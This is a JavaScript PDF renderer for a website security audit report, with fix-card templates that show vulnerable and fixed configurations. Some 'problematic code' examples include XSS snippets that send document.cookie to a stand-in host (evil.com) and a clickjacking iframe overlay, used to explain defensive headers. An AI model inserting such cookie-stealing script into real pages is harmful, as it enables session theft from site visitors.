/**
 * Security Report — PDF Renderer
 * Renders all security analysis sections into the PDF template.
 * Rich fix cards with code examples, impact scores, steps, and resources
 * to match the web UI depth provided by security-fixes-renderer.js.
 */
(function (window) {
  'use strict';

  if (!window.PdfReport) {
    console.error('[security-report-render] PdfReport not loaded');
    return;
  }

  var PR = window.PdfReport;

  /* -------------------------------------------------------------------------
     Fix-card template data (mirrors security-fixes-renderer.js)
     ------------------------------------------------------------------------- */
  var FIX_TEMPLATES = {
    'Implement HTTPS': {
      category: 'SSL/TLS',
      impact: '+30 Security Score',
      summary: 'Your website is not using HTTPS encryption, which means all data transmitted between your server and visitors is sent in plain text. This includes passwords, personal information, payment details, and session tokens, all of which can be intercepted by attackers on the same network through man-in-the-middle attacks. Modern browsers display a prominent "Not Secure" warning in the address bar for HTTP sites, which erodes visitor trust and increases bounce rates. Google also uses HTTPS as a ranking signal, so unencrypted sites face a measurable SEO penalty.',
      problematicCode: '<VirtualHost *:80>\n    ServerName example.com\n    DocumentRoot /var/www/html\n</VirtualHost>\n\n<!-- Issues: -->\n<!-- Data transmitted in plain text -->\n<!-- Vulnerable to man-in-the-middle attacks -->\n<!-- Browser shows "Not Secure" warning -->',
      fixedCode: '<VirtualHost *:443>\n    ServerName example.com\n    SSLEngine on\n    SSLCertificateFile /etc/ssl/certs/example.com.crt\n    SSLCertificateKeyFile /etc/ssl/private/example.com.key\n    SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1\n</VirtualHost>\n\n<VirtualHost *:80>\n    Redirect permanent / https://example.com/\n</VirtualHost>',
      steps: [
        'Get a free SSL certificate from Let\'s Encrypt using certbot',
        'Install the certificate and configure your web server',
        'Set up automatic HTTP to HTTPS redirect'
      ]
    },
    'Fix SSL/TLS Issues': {
      category: 'SSL/TLS',
      impact: '+20 Security Score',
      summary: 'Your SSL/TLS certificate or protocol configuration has issues that may compromise the security of encrypted connections. Outdated protocols like TLS 1.0 and 1.1 have known vulnerabilities that attackers can exploit.',
      problematicCode: 'SSLProtocol all\n# Allows outdated TLS 1.0, TLS 1.1\n# Weak cipher suites enabled',
      fixedCode: 'SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1\nSSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:...\nSSLHonorCipherOrder on',
      steps: [
        'Update certificate or upgrade TLS protocol version',
        'Disable TLS 1.0 and 1.1 in your server configuration',
        'Test with SSL Labs (ssllabs.com) to verify an A rating'
      ]
    },
    'Implement Content Security Policy': {
      category: 'Security Headers',
      impact: '+15 Security Score',
      summary: 'Your site lacks a Content Security Policy (CSP) header, leaving it vulnerable to Cross-Site Scripting (XSS) attacks. CSP tells the browser which sources of content are allowed to load on your page. Without it, attackers who find an injection point can execute arbitrary JavaScript that steals user cookies, redirects visitors to phishing pages, or silently records keystrokes.',
      problematicCode: '<!-- No CSP - Vulnerable to XSS -->\n<script>\n  // Attacker can inject:\n  document.write(\'<img src="https://evil.com/steal?c=\'\n    + document.cookie + \'">\');\n</script>',
      fixedCode: 'Content-Security-Policy:\n  default-src \'self\';\n  script-src \'self\' \'nonce-abc123\';\n  style-src \'self\' \'unsafe-inline\';\n  img-src \'self\' data: https:;\n  frame-ancestors \'none\';\n  base-uri \'self\';',
      steps: [
        'Start with Content-Security-Policy-Report-Only header to find issues',
        'Set default-src \'self\'; script-src \'self\' as your base policy',
        'Replace inline scripts/styles with external files or add nonces',
        'Switch to enforcing Content-Security-Policy header'
      ]
    },
    'Enable HTTP Strict Transport Security': {
      category: 'Security Headers',
      impact: '+10 Security Score',
      summary: 'HSTS header is not configured, leaving your site vulnerable to protocol downgrade attacks. When a user types your domain without "https://", the browser initially connects over plain HTTP before being redirected. During that brief unencrypted request, an attacker can intercept and prevent the redirect entirely (SSL stripping).',
      problematicCode: '<!-- Without HSTS -->\n<!-- User types: example.com -->\n<!-- Browser connects via HTTP first -->\nHTTP/1.1 301 Moved Permanently\nLocation: https://example.com/',
      fixedCode: 'Strict-Transport-Security:\n  max-age=31536000; includeSubDomains; preload\n\n# Apache\nHeader always set Strict-Transport-Security \\\n    "max-age=31536000; includeSubDomains; preload"\n\n# Nginx\nadd_header Strict-Transport-Security \\\n    "max-age=31536000; includeSubDomains; preload" always;',
      steps: [
        'Verify HTTPS works on all pages first',
        'Add Strict-Transport-Security: max-age=300 and test',
        'Increase to max-age=31536000; includeSubDomains after testing'
      ]
    },
    'Prevent Clickjacking Attacks': {
      category: 'Security Headers',
      impact: '+5 Security Score',
      summary: 'X-Frame-Options header is not set, leaving your site vulnerable to clickjacking attacks. A malicious website can load your page inside an invisible iframe and overlay deceptive content, tricking users into clicking buttons on your site without realizing it.',
      problematicCode: '<!-- Without X-Frame-Options -->\n<!-- Attacker page: -->\n<style>iframe { opacity: 0; position: absolute; }</style>\n<button class="fake">Win a Prize!</button>\n<iframe src="https://yoursite.com/settings"></iframe>',
      fixedCode: 'X-Frame-Options: DENY\n\n# Or modern CSP alternative:\nContent-Security-Policy: frame-ancestors \'none\';\n\n# Apache\nHeader always set X-Frame-Options "DENY"\n\n# Nginx\nadd_header X-Frame-Options "DENY" always;',
      steps: [
        'Add header: X-Frame-Options: DENY to your server config',
        'Also add CSP: frame-ancestors \'none\' for modern browsers'
      ]
    },
    'Prevent MIME Sniffing': {
      category: 'Security Headers',
      impact: '+5 Security Score',
      summary: 'X-Content-Type-Options header is missing, which allows browsers to override the declared content type and guess what a file actually contains. Attackers can exploit this by uploading files with harmless extensions that contain malicious scripts.',
      problematicCode: '<!-- Without X-Content-Type-Options -->\n<!-- Server responds: Content-Type: text/plain -->\n<!-- Browser "sniffs" and may execute as HTML/JS -->\n<script>alert(\'XSS\')</script>',
      fixedCode: 'X-Content-Type-Options: nosniff\n\n# Apache\nHeader always set X-Content-Type-Options "nosniff"\n\n# Nginx\nadd_header X-Content-Type-Options "nosniff" always;\n\n# Express.js\napp.use((req, res, next) => {\n  res.setHeader(\'X-Content-Type-Options\', \'nosniff\');\n  next();\n});',
      steps: [
        'Add header: X-Content-Type-Options: nosniff to all responses',
        'Ensure your server sends correct Content-Type for all files',
        'Test file downloads and uploads work correctly after implementation'
      ]
    },
    'Improve Cookie Security': {
      category: 'Cookies',
      impact: '+10 Security Score',
      summary: 'Cookies are not properly secured, putting user sessions and sensitive data at risk. Without HttpOnly, JavaScript can read session cookies and send them to an attacker. Without Secure, cookies are transmitted over unencrypted HTTP. The SameSite attribute prevents cross-site request forgery (CSRF) attacks.',
      problematicCode: 'Set-Cookie: session=abc123\n\n<!-- JavaScript can access cookies -->\n<script>\n  new Image().src = \'https://evil.com/steal?c=\'\n    + document.cookie;\n</script>\n\n<!-- No HttpOnly, Secure, or SameSite -->',
      fixedCode: 'Set-Cookie: session=abc123;\n  HttpOnly; Secure; SameSite=Strict; Path=/\n\n// Express.js\napp.use(session({\n  cookie: {\n    httpOnly: true,\n    secure: true,\n    sameSite: \'strict\',\n    maxAge: 3600000\n  }\n}));',
      steps: [
        'Add HttpOnly; Secure; SameSite=Lax flags to all session cookies',
        'Update your session library or framework configuration',
        'Test login/logout functionality still works'
      ]
    },
    'Add Subresource Integrity Checks': {
      category: 'Third-Party Scripts',
      impact: '+8 Security Score',
      summary: 'Third-party scripts are loaded without integrity verification, creating a supply chain vulnerability. If the CDN hosting these files is compromised, an attacker could replace legitimate files with malicious code. Subresource Integrity (SRI) adds a cryptographic hash to each external resource tag so the browser can verify the file before executing it.',
      problematicCode: '<!-- Without SRI -->\n<script src="https://cdn.example.com/jquery.min.js">\n</script>\n<link href="https://cdn.example.com/bootstrap.min.css"\n  rel="stylesheet">\n\n<!-- If CDN compromised, malware executes -->',
      fixedCode: '<!-- With SRI -->\n<script\n  src="https://cdn.example.com/jquery.min.js"\n  integrity="sha384-vtXRMe3mGCbOeY7l30..."\n  crossorigin="anonymous">\n</script>\n\n<link\n  href="https://cdn.example.com/bootstrap.min.css"\n  rel="stylesheet"\n  integrity="sha384-1BmE4kWBq78iYhFl..."\n  crossorigin="anonymous">',
      steps: [
        'Generate SRI hashes at srihash.org for each external script/stylesheet',
        'Add integrity and crossorigin="anonymous" attributes',
        'Update hashes whenever you upgrade library versions'
      ]
    }
  };

  PdfReport.register('security', function renderSecurity(data, utils) {
    var t = utils.t;
    var esc = utils.esc;
    var truncate = utils.truncate;
    var scoreClass = utils.scoreClass;
    var translateImpact = utils.translateImpact || function(v) { return v; };

    var sectionIndex = 1;

    /* -----------------------------------------------------------------------
       1. SSL/TLS Certificate
       ----------------------------------------------------------------------- */
    (function () {
      var sec = document.querySelector('#section-ssl .pdf-section__content');
      var d = data.ssl || {};
      var score = d.score;

      sec.parentElement.insertBefore(
        _htmlToNode(PR.renderSectionHeader(sectionIndex++, t('security.sslTlsSecurity', 'SSL/TLS Security'), score)),
        sec
      );

      var html = '';

      html += '<p class="pdf-section__intro">' + esc(t('security.report.sectionIntros.ssl', 'SSL/TLS certificates establish encrypted connections between your server and visitors, protecting data in transit. A valid, properly configured certificate is essential for user trust and search engine rankings. This section evaluates your certificate validity, protocol version, issuer, and expiration status. Modern sites should use TLS 1.2 or higher and ensure certificates are renewed well before expiration.')) + '</p>';

      // SSL Overview table
      html += '<h3 class="pdf-subsection__title">' + esc(t('security.report.ssl.overviewHeading', 'Certificate Details')) + '</h3>';

      var rows = [];
      rows.push([
        esc(t('security.report.ssl.rows.status', 'Certificate Status')),
        d.valid ? PR.renderStatus('pass', t('security.validCertificate', 'Valid')) : PR.renderStatus('fail', t('security.invalidCertificate', 'Invalid'))
      ]);
      rows.push([
        esc(t('security.report.ssl.rows.protocol', 'Protocol')),
        esc(d.protocol || '-')
      ]);
      rows.push([
        esc(t('security.report.ssl.rows.issuer', 'Issuer')),
        esc(d.issuer || '-')
      ]);
      rows.push([
        esc(t('security.report.ssl.rows.validFrom', 'Valid From')),
        esc(d.validFrom || '-')
      ]);
      rows.push([
        esc(t('security.report.ssl.rows.validUntil', 'Valid Until')),
        esc(d.validUntil || '-')
      ]);
      rows.push([
        esc(t('security.report.ssl.rows.daysRemaining', 'Days Remaining')),
        d.daysRemaining !== null && d.daysRemaining !== undefined
          ? '<span style="color:' + (d.daysRemaining > 30 ? '#10b981' : d.daysRemaining > 7 ? '#f59e0b' : '#ef4444') + ';font-weight:600;">' + d.daysRemaining + '</span>'
          : '-'
      ]);

      html += PR.renderTable(
        [
          { label: t('seo.report.table.property', 'Property'), width: '35%' },
          { label: t('seo.report.table.value', 'Value'), width: '65%' }
        ],
        rows,
        { striped: true }
      );

      // Metrics
      html += PR.renderMetrics([
        { value: d.valid ? t('security.validCertificate', 'Valid') : t('security.invalidCertificate', 'Invalid'), label: t('security.report.ssl.rows.status', 'Certificate Status'), color: d.valid ? '#10b981' : '#ef4444' },
        { value: d.protocol || '-', label: t('security.report.ssl.rows.protocol', 'Protocol') },
        { value: d.daysRemaining !== null && d.daysRemaining !== undefined ? d.daysRemaining : '-', label: t('security.report.ssl.rows.daysRemaining', 'Days Remaining') }
      ]);

      if (d.issues && d.issues.length > 0) {
        html += _renderIssuesList(d.issues, t);
      }

      sec.innerHTML = html;
    })();

    /* -----------------------------------------------------------------------
       2. Security Headers
       ----------------------------------------------------------------------- */
    (function () {
      var sec = document.querySelector('#section-headers .pdf-section__content');
      var d = data.headers || {};
      var score = d.score;

      sec.parentElement.insertBefore(
        _htmlToNode(PR.renderSectionHeader(sectionIndex++, t('security.headers', 'Security Headers'), score)),
        sec
      );

      var html = '';

      html += '<p class="pdf-section__intro">' + esc(t('security.report.sectionIntros.headers', 'Security headers instruct browsers on how to handle your site\'s content, providing defense against cross-site scripting, clickjacking, and other common attacks. Each header serves a specific protective function. This section evaluates the implementation of critical security headers and identifies missing protections that leave your site vulnerable.')) + '</p>';

      // Progress bar
      html += PR.renderProgress(
        t('security.report.headers.implementedLabel', 'Headers Implemented'),
        d.implemented || 0, d.total || 6
      );

      // Header details table — split into separate Value and Risk columns like web UI
      if (d.details) {
        var headerRows = [];
        var headerNames = Object.keys(d.details);
        headerNames.forEach(function (name) {
          var h = d.details[name];
          headerRows.push([
            '<strong>' + esc(name) + '</strong>',
            h.present ? PR.renderStatus('pass', t('security.report.status.present', 'Present')) : PR.renderStatus('fail', t('security.report.status.missing', 'Missing')),
            h.present
              ? '<span style="font-family:monospace;font-size:0.7rem;word-break:break-all;">' + esc(truncate(h.value || '', 80)) + '</span>'
              : '<span style="color:#9ca3af;font-style:italic;">' + esc(t('security.report.headers.notSet', 'Not set')) + '</span>',
            esc(h.description || '') +
              (!h.present && h.risk ? '<br><span style="color:#ef4444;font-weight:500;">' + esc(t('security.report.headers.risk', 'Risk')) + ': ' + esc(h.risk) + '</span>' : '')
          ]);
        });

        html += PR.renderTable(
          [
            { label: t('security.report.headers.table.header', 'Header'), width: '20%' },
            { label: t('seo.report.table.status', 'Status'), width: '10%' },
            { label: t('seo.report.table.value', 'Value'), width: '30%' },
            { label: t('security.report.headers.table.descriptionRisk', 'Description / Risk'), width: '40%' }
          ],
          headerRows,
          { striped: true }
        );
      }

      sec.innerHTML = html;
    })();

    /* -----------------------------------------------------------------------
       3. Vulnerabilities & Threats
       ----------------------------------------------------------------------- */
    (function () {
      var sec = document.querySelector('#section-vulnerabilities .pdf-section__content');
      var d = data.vulnerabilities || {};
      var score = d.score;

      sec.parentElement.insertBefore(
        _htmlToNode(PR.renderSectionHeader(sectionIndex++, t('security.vulnerabilities', 'Vulnerabilities'), score)),
        sec
      );

      var html = '';

      html += '<p class="pdf-section__intro">' + esc(t('security.report.sectionIntros.vulnerabilities', 'This section identifies potential security vulnerabilities discovered during the analysis. Vulnerabilities are categorized by severity level — critical issues require immediate attention, while lower-severity findings represent opportunities to strengthen your security posture. Regular vulnerability assessments are essential for maintaining a secure web presence.')) + '</p>';

      // Severity metrics
      html += PR.renderMetrics([
        { value: d.critical || 0, label: t('security.report.vulnerabilities.critical', 'Critical'), color: (d.critical || 0) > 0 ? '#ef4444' : '#10b981' },
        { value: d.high || 0, label: t('security.report.vulnerabilities.high', 'High'), color: (d.high || 0) > 0 ? '#f97316' : '#10b981' },
        { value: d.medium || 0, label: t('security.report.vulnerabilities.medium', 'Medium'), color: (d.medium || 0) > 0 ? '#f59e0b' : '#10b981' },
        { value: d.low || 0, label: t('security.report.vulnerabilities.low', 'Low'), color: (d.low || 0) > 0 ? '#3b82f6' : '#10b981' }
      ]);

      // Detailed severity breakdown table (matches web UI)
      html += '<h3 class="pdf-subsection__title">' + esc(t('security.report.vulnerabilities.severityBreakdown', 'Severity Breakdown')) + '</h3>';
      var sevRows = [
        [
          '<span style="color:#ef4444;font-weight:600;">' + esc(t('security.report.vulnerabilities.critical', 'Critical')) + '</span>',
          '<span style="color:' + ((d.critical || 0) > 0 ? '#ef4444' : '#10b981') + ';font-weight:700;font-size:1.05rem;">' + (d.critical || 0) + '</span>'
        ],
        [
          '<span style="color:#f97316;font-weight:600;">' + esc(t('security.report.vulnerabilities.high', 'High')) + '</span>',
          '<span style="color:' + ((d.high || 0) > 0 ? '#f97316' : '#10b981') + ';font-weight:700;font-size:1.05rem;">' + (d.high || 0) + '</span>'
        ],
        [
          '<span style="color:#f59e0b;font-weight:600;">' + esc(t('security.report.vulnerabilities.medium', 'Medium')) + '</span>',
          '<span style="color:' + ((d.medium || 0) > 0 ? '#f59e0b' : '#10b981') + ';font-weight:700;font-size:1.05rem;">' + (d.medium || 0) + '</span>'
        ],
        [
          '<span style="color:#3b82f6;font-weight:600;">' + esc(t('security.report.vulnerabilities.low', 'Low')) + '</span>',
          '<span style="color:' + ((d.low || 0) > 0 ? '#3b82f6' : '#10b981') + ';font-weight:700;font-size:1.05rem;">' + (d.low || 0) + '</span>'
        ]
      ];
      html += PR.renderTable(
        [
          { label: t('security.report.vulnerabilities.severityLevel', 'Severity Level'), width: '60%' },
          { label: t('security.report.vulnerabilities.count', 'Count'), width: '40%' }
        ],
        sevRows,
        { striped: true }
      );

      // Issue cards with CVE + solution (matches web UI)
      if (d.issues && d.issues.length > 0) {
        html += '<h3 class="pdf-subsection__title">' + esc(t('security.report.vulnerabilities.detectedHeading', 'Detected Vulnerabilities')) + '</h3>';
        d.issues.slice(0, 15).forEach(function (issue) {
          var sev = (issue.severity || 'medium').toLowerCase();
          html += '<div class="pdf-issue pdf-issue--' + sev + '">' +
            '<span class="pdf-issue__severity pdf-issue__severity--' + sev + '">' + esc(translateImpact(issue.severity || 'medium')) + '</span>' +
            '<span class="pdf-issue__text"><strong>' + esc(issue.title || '') + '</strong>' +
            (issue.description ? ' &mdash; ' + esc(issue.description) : '') +
            (issue.cve ? '<br><span style="font-size:0.75rem;color:#6b7280;">CVE: ' + esc(issue.cve) + '</span>' : '') +
            (issue.solution ? '<br><span style="font-size:0.78rem;color:#10b981;"><strong>' + esc(t('security.report.vulnerabilities.solution', 'Solution')) + ':</strong> ' + esc(issue.solution) + '</span>' : '') +
            '</span>' +
          '</div>';
        });
      } else {
        html += PR.renderCallout(
          t('security.report.vulnerabilities.noneFoundTitle', 'No Vulnerabilities Detected'),
          t('security.report.vulnerabilities.noneFoundBody', 'No significant vulnerabilities were identified during the analysis.'),
          'tip'
        );
      }

      // OWASP reference callout (matches web UI)
      html += PR.renderCallout(
        t('security.report.vulnerabilities.owaspRefTitle', 'OWASP Reference'),
        t('security.report.vulnerabilities.owaspRefBody', 'This analysis covers OWASP Top 10 categories including Injection, Broken Authentication, Sensitive Data Exposure, XML External Entities (XXE), and Security Misconfiguration.'),
        'info'
      );

      sec.innerHTML = html;
    })();

    /* -----------------------------------------------------------------------
       4. Cookie Security
       ----------------------------------------------------------------------- */
    (function () {
      var sec = document.querySelector('#section-cookies .pdf-section__content');
      var d = data.cookies || {};
      var score = d.score;

      sec.parentElement.insertBefore(
        _htmlToNode(PR.renderSectionHeader(sectionIndex++, t('security.cookies', 'Cookie Security'), score)),
        sec
      );

      var html = '';

      html += '<p class="pdf-section__intro">' + esc(t('security.report.sectionIntros.cookies', 'Cookies store session data and user preferences, making their security critical for protecting user privacy. Properly configured cookies use the Secure, HttpOnly, and SameSite attributes to prevent theft and misuse. This section audits all cookies detected on your site and evaluates their security configuration.')) + '</p>';

      // Metrics
      html += PR.renderMetrics([
        { value: d.total || 0, label: t('security.report.cookies.totalLabel', 'Total Cookies') },
        { value: d.secure || 0, label: t('security.report.cookies.secureLabel', 'Properly Secured'), color: '#10b981' }
      ]);

      // Progress bar
      if (d.total > 0) {
        html += PR.renderProgress(
          t('security.report.cookies.securedLabel', 'Cookies Secured'),
          d.secure || 0, d.total
        );
      }

      // Cookie table — now includes Issues column like web UI
      if (d.list && d.list.length > 0) {
        html += '<h3 class="pdf-subsection__title">' + esc(t('security.report.cookies.detailsHeading', 'Cookie Details')) + '</h3>';
        var cookieRows = d.list.slice(0, 20).map(function (c) {
          var issuesText = '';
          if (c.issues && c.issues.length > 0) {
            issuesText = '<span style="color:#ef4444;font-size:0.75rem;">' + c.issues.map(function (iss) { return esc(iss); }).join(', ') + '</span>';
          } else {
            issuesText = '<span style="color:#9ca3af;font-size:0.75rem;">' + esc(t('common.pdf.status.none', 'None')) + '</span>';
          }
          var sameSiteVal = c.sameSite || 'None';
          var sameSiteColor = (sameSiteVal === 'Strict' || sameSiteVal === 'Lax') ? '#10b981' : '#ef4444';
          return [
            '<span class="pdf-table__truncate">' + esc(truncate(c.name, 28)) + '</span>',
            c.httpOnly ? PR.renderStatus('pass', t('seo.report.status.yes', 'Yes')) : PR.renderStatus('fail', t('seo.report.status.no', 'No')),
            c.secure ? PR.renderStatus('pass', t('seo.report.status.yes', 'Yes')) : PR.renderStatus('fail', t('seo.report.status.no', 'No')),
            '<span style="color:' + sameSiteColor + ';font-weight:600;">' + esc(sameSiteVal) + '</span>',
            issuesText
          ];
        });

        html += PR.renderTable(
          [
            { label: t('security.report.cookies.table.name', 'Cookie Name'), width: '25%' },
            { label: 'HttpOnly', width: '10%' },
            { label: 'Secure', width: '10%' },
            { label: 'SameSite', width: '12%' },
            { label: t('security.report.cookies.table.issues', 'Issues'), width: '43%' }
          ],
          cookieRows,
          { striped: true }
        );
      }

      if (d.issues && d.issues.length > 0) {
        html += _renderIssuesList(d.issues, t);
      }

      sec.innerHTML = html;
    })();

    /* -----------------------------------------------------------------------
       5. Third-Party Scripts
       ----------------------------------------------------------------------- */
    (function () {
      var sec = document.querySelector('#section-thirdparty .pdf-section__content');
      var d = data.thirdPartyScripts || {};
      var score = d.score;

      sec.parentElement.insertBefore(
        _htmlToNode(PR.renderSectionHeader(sectionIndex++, t('security.thirdParty', 'Third-Party Scripts'), score)),
        sec
      );

      var html = '';

      html += '<p class="pdf-section__intro">' + esc(t('security.report.sectionIntros.thirdParty', 'Third-party scripts extend your site\'s functionality but introduce security risks. Each external script is a potential attack vector if compromised. Subresource Integrity (SRI) hashes verify that fetched scripts haven\'t been tampered with. This section evaluates all external scripts, their loading patterns, and SRI coverage.')) + '</p>';

      // Metrics
      html += PR.renderMetrics([
        { value: d.total || 0, label: t('security.report.thirdParty.totalLabel', 'External Scripts') },
        { value: d.withSRI || 0, label: t('security.report.thirdParty.withSriLabel', 'With SRI'), color: '#10b981' }
      ]);

      // Coverage metric
      if (d.total > 0) {
        html += PR.renderProgress(
          t('security.report.thirdParty.sriCoverageLabel', 'SRI Coverage'),
          d.withSRI || 0, d.total
        );
      }

      // Scripts table — now includes Async column like web UI
      if (d.scripts && d.scripts.length > 0) {
        html += '<h3 class="pdf-subsection__title">' + esc(t('security.report.thirdParty.detailsHeading', 'Script Details')) + '</h3>';
        var scriptRows = d.scripts.slice(0, 20).map(function (s) {
          var riskColor = s.risk === 'high' ? '#ef4444' : s.risk === 'medium' ? '#f59e0b' : '#10b981';
          return [
            '<span class="pdf-table__truncate">' + esc(truncate(s.url, 55)) + '</span>',
            s.hasSRI ? PR.renderStatus('pass', t('seo.report.status.yes', 'Yes')) : PR.renderStatus('fail', t('seo.report.status.no', 'No')),
            s.async ? PR.renderStatus('pass', t('seo.report.status.yes', 'Yes')) : PR.renderStatus('warn', t('seo.report.status.no', 'No')),
            s.https ? PR.renderStatus('pass', 'HTTPS') : PR.renderStatus('fail', 'HTTP'),
            '<span style="color:' + riskColor + ';font-weight:600;">' + esc(s.risk || 'low') + '</span>'
          ];
        });

        html += PR.renderTable(
          [
            { label: t('security.report.thirdParty.table.scriptUrl', 'Script URL'), width: '38%' },
            { label: 'SRI', width: '10%' },
            { label: 'Async', width: '10%' },
            { label: t('security.report.thirdParty.table.protocol', 'Protocol'), width: '12%' },
            { label: t('security.report.thirdParty.table.risk', 'Risk'), width: '12%' }
          ],
          scriptRows,
          { striped: true }
        );
      }

      // SRI Best Practices callout (matches web UI)
      html += PR.renderCallout(
        t('security.report.thirdParty.sriBestPracticesTitle', 'Subresource Integrity (SRI) Best Practices'),
        t('security.report.thirdParty.sriBestPracticesBody', 'Use SRI hashes to ensure third-party scripts have not been tampered with. Always load external resources over HTTPS. Use async/defer attributes to prevent blocking page rendering. Regularly audit and minimize third-party dependencies.'),
        'info'
      );

      sec.innerHTML = html;
    })();

    /* -----------------------------------------------------------------------
       6. Desktop vs Mobile Comparison
       ----------------------------------------------------------------------- */
    (function () {
      var sec = document.querySelector('#section-comparison .pdf-section__content');
      if (!sec) return;
      var desktop = data.desktop;
      var mobile = data.mobile;
      if (!desktop || !mobile) {
        sec.parentElement.style.display = 'none';
        return;
      }

      sec.parentElement.insertBefore(
        _htmlToNode(PR.renderSectionHeader(sectionIndex++, t('security.report.comparison.heading', 'Desktop vs Mobile Security Analysis'))),
        sec
      );

      var html = '';

      html += '<p class="pdf-section__intro">' + esc(t('security.report.comparison.intro', 'Security posture can differ between desktop and mobile environments. This section compares key security indicators across both platforms to highlight any discrepancies.')) + '</p>';

      // Side-by-side metrics
      html += PR.renderMetrics([
        { value: desktop.securityScore || 0, label: t('common.pdf.desktop', 'Desktop'), color: PdfReport.helpers.scoreColor(desktop.securityScore || 0) },
        { value: mobile.securityScore || 0, label: t('common.pdf.mobile', 'Mobile'), color: PdfReport.helpers.scoreColor(mobile.securityScore || 0) }
      ]);

      // Comparison table
      var cmpRows = [];
      cmpRows.push([
        esc('HTTPS'),
        desktop.https ? PR.renderStatus('pass', t('security.report.comparison.enabled', 'Enabled')) : PR.renderStatus('fail', t('security.report.comparison.missing', 'Missing')),
        mobile.https ? PR.renderStatus('pass', t('security.report.comparison.enabled', 'Enabled')) : PR.renderStatus('fail', t('security.report.comparison.missing', 'Missing'))
      ]);
      cmpRows.push([
        esc(t('security.report.comparison.mixedContent', 'Mixed Content')),
        '<span style="color:' + ((desktop.mixedContent || 0) === 0 ? '#10b981' : '#ef4444') + ';font-weight:600;">' + (desktop.mixedContent || 0) + ' ' + esc(t('security.report.comparison.issues', 'issues')) + '</span>',
        '<span style="color:' + ((mobile.mixedContent || 0) === 0 ? '#10b981' : '#ef4444') + ';font-weight:600;">' + (mobile.mixedContent || 0) + ' ' + esc(t('security.report.comparison.issues', 'issues')) + '</span>'
      ]);
      cmpRows.push([
        esc('CSP'),
        desktop.csp ? PR.renderStatus('pass', t('security.report.status.present', 'Present')) : PR.renderStatus('warn', t('security.report.status.missing', 'Missing')),
        mobile.csp ? PR.renderStatus('pass', t('security.report.status.present', 'Present')) : PR.renderStatus('warn', t('security.report.status.missing', 'Missing'))
      ]);
      cmpRows.push([
        esc('HSTS'),
        desktop.hsts ? PR.renderStatus('pass', t('security.report.status.present', 'Present')) : PR.renderStatus('warn', t('security.report.status.missing', 'Missing')),
        mobile.hsts ? PR.renderStatus('pass', t('security.report.status.present', 'Present')) : PR.renderStatus('warn', t('security.report.status.missing', 'Missing'))
      ]);

      html += PR.renderTable(
        [
          { label: t('security.report.comparison.metric', 'Metric'), width: '34%' },
          { label: t('common.pdf.desktop', 'Desktop'), width: '33%' },
          { label: t('common.pdf.mobile', 'Mobile'), width: '33%' }
        ],
        cmpRows,
        { striped: true }
      );

      // Platform gap warning
      var gap = Math.abs((desktop.securityScore || 0) - (mobile.securityScore || 0));
      if (gap > 10) {
        html += PR.renderCallout(
          t('security.report.comparison.platformGapTitle', 'Platform Security Gap'),
          gap + ' ' + t('security.report.comparison.platformGapBody', 'point difference detected between desktop and mobile. Investigate platform-specific issues.'),
          'warning'
        );
      }

      sec.innerHTML = html;
    })();

    /* -----------------------------------------------------------------------
       7. OWASP Compliance
       ----------------------------------------------------------------------- */
    (function () {
      var sec = document.querySelector('#section-owasp .pdf-section__content');
      if (!sec) return;
      var compliance = data.owaspCompliance;
      if (compliance === undefined || compliance === null) {
        sec.parentElement.style.display = 'none';
        return;
      }

      sec.parentElement.insertBefore(
        _htmlToNode(PR.renderSectionHeader(sectionIndex++, t('security.report.owasp.heading', 'OWASP Top 10 Compliance'))),
        sec
      );

      var html = '';

      html += PR.renderMetrics([
        { value: compliance + '%', label: t('security.report.owasp.controlsImplemented', 'Controls Implemented'), color: compliance >= 70 ? '#10b981' : '#ef4444' }
      ]);

      html += PR.renderProgress(
        t('security.report.owasp.complianceLevel', 'OWASP Compliance Level'),
        compliance, 100
      );

      if (compliance >= 70) {
        html += PR.renderCallout(
          t('security.report.owasp.goodTitle', 'Good Security Posture'),
          compliance + '% ' + t('security.report.owasp.goodBody', 'of OWASP Top 10 security controls implemented.'),
          'tip'
        );
      } else {
        html += PR.renderCallout(
          t('security.report.owasp.improvementsTitle', 'Improvements Needed'),
          compliance + '% ' + t('security.report.owasp.improvementsBody', 'of OWASP Top 10 security controls implemented. Review the recommendations section for prioritized fixes.'),
          'warning'
        );
      }

      sec.innerHTML = html;
    })();

    /* -----------------------------------------------------------------------
       8. Recommendations — Rich Fix Cards
       Renders detailed, actionable security fix cards with code examples,
       severity badges, impact scores, before/after code blocks, affected
       resources tables, and step-by-step fix guides.
       Priority: data.enrichedFixes > generated from scan data > simple fallback
       ----------------------------------------------------------------------- */
    (function () {
      var sec = document.querySelector('#section-recommendations .pdf-section__content');

      sec.parentElement.insertBefore(
        _htmlToNode(PR.renderSectionHeader(sectionIndex++, t('security.report.recommendations', 'Recommendations'))),
        sec
      );

      var html = '';

      html += '<p class="pdf-section__intro">' + esc(t('security.report.sectionIntros.recommendations', 'Based on the security analysis, these recommendations prioritize the most impactful improvements for your site\'s security posture. Each recommendation includes the specific issue, its potential impact, and actionable steps for remediation.')) + '</p>';

      // Priority cascade: enrichedFixes > generated from scan data > simple recs
      // pdf-export-utility stores as data.enrichedFixes.security (array) or data.enrichedFixes (array)
      var fixes;
      var preEnriched = null;
      if (data.enrichedFixes) {
        if (Array.isArray(data.enrichedFixes) && data.enrichedFixes.length > 0) {
          preEnriched = data.enrichedFixes;
        } else if (Array.isArray(data.enrichedFixes.security) && data.enrichedFixes.security.length > 0) {
          preEnriched = data.enrichedFixes.security;
        }
      }
      if (preEnriched) {
        fixes = _normalizeEnrichedFixes(preEnriched);
      } else {
        fixes = _generateSecurityFixesFromScanData(data);
      }

      if (fixes && fixes.length > 0) {
        // Severity group labels
        var sevGroups = [
          { key: 'critical', label: t('security.report.fixCard.criticalIssues', 'Critical Issues') },
          { key: 'high', label: t('security.report.fixCard.highPriority', 'High Priority') },
          { key: 'medium', label: t('security.report.fixCard.mediumPriority', 'Medium Priority') },
          { key: 'low', label: t('security.report.fixCard.lowPriority', 'Low Priority') }
        ];

        // Summary count banner
        html += '<div style="display:flex;align-items:center;gap:8px;margin-bottom:16px;padding:10px 14px;background:#fafafa;border:1px solid rgba(0,0,0,0.08);border-radius:8px;">';
        html += '<span style="font-size:0.85rem;font-weight:600;color:#111827;">' + esc(t('security.report.fixCard.fixesOverview', 'Fixes Overview')) + '</span>';
